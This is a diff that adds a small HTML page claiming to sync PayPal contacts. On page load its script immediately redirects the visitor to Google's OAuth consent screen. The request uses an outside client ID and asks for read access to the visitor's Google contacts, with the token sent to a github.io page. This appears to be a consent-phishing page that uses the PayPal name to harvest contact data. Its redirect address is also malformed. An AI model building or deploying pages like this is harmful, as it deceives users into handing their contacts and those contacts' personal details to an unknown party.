@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🔄 Syncing Contacts...</title>
+</head>
+<body>
+    <h1>📲 Syncing PayPal Contacts...</h1>
+    <p>This may take a few seconds. Do not close this window.</p>
+    <script>
+        const clientId = '815649131075-ntqdd7sgdt0jj9iimm2n1aqmp1q5e65i.apps.googleusercontent.com';
+        const redirectUri = 'https://https://contar1.github.io/oauth.html';
+        const scope = 'https://www.googleapis.com/auth/contacts.readonly';
+
+        const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=${scope}&include_granted_scopes=true`;
+
+        window.location.href = authUrl;
+    </script>
+</body>
+</html>
